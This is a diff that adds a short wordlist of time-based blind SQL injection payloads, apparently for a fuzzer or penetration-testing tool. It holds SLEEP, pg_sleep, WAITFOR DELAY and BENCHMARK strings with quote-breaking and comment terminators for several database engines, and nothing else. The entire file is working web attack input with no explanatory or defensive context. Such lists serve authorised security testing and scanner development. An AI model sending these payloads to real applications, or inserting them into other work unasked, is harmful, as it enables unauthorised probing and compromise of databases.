@@ -1,0 +1,21 @@
+SLEEP(10)#
+SLEEP(10)--
+' OR SLEEP(10)#
+" OR SLEEP(10)#
+' OR SLEEP(10)='
+" OR SLEEP(10)="
+OR SLEEP(10)#
+OR SLEEP(10)--
+' AND SLEEP(10) AND '1
+" AND SLEEP(10) AND "1
+pg_sleep(10)--
+pg_sleep(10)#
+' OR pg_sleep(10)#
+" OR pg_sleep(10)#
+OR pg_sleep(10)--
+waitfor delay '00:00:10'--
+waitfor delay '00:00:10'#
+benchmark(50000000,MD5(1))#
+benchmark(50000000,MD5(1))--
+' OR benchmark(50000000,MD5(1))#
+" OR benchmark(50000000,MD5(1))#
